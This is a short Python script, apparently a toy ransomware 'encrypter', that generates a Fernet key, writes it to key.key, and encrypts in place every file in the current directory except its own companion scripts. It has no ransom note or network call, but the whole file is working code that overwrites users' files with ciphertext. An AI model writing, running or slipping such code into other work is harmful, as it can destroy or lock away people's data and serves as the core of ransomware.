import os

from cryptography.fernet import Fernet

key = Fernet.generate_key()

files=[]

#reading files
for file in os.listdir():
    if file=="encrypter.py" or file== "key.key" or file == "decrypter.py" or file == "imagebinary.py" or file == "dividedbynandk.bat" or file == "division.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print("Encryption done for: ", files)


with open("key.key", "wb") as keykey:
    keykey.write(key)


for file in files:
    with open(file, "rb") as x:
        y = x.read()
    z = Fernet(key).encrypt(y)
    with open(file, "wb") as x:
        x.write(z)





        
        
    
    
